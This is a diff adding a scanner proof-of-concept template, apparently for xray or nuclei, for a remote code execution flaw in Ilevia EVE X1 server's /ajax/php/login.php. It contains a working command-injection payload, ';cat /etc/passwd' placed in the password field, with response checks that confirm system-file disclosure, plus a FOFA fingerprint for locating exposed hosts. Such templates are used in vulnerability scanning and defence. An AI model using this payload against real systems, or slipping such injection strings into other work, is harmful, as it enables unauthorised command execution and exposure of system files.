@@ -1,0 +1,27 @@
+id: poc-yaml-ilevia-eve-x1-server-login-php-rce
+info:
+  name: Ilevia EVE X1 服务器 login.php 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: ilevia_eve_x1_server
+  fofa: icon_hash="392278119"
+requests:
+- method: POST
+  path: /ajax/php/login.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: userid=admin&passwd=;cat%20/etc/passwd
+  expression: 'status_code == 200 &&
+
+    contains(body,"root:") &&
+
+    contains(body,"/bin") &&
+
+    contains(body,"Wrong password") &&
+
+    !contains(body,"<")
+
+    '
+variables: {}
+transport: http
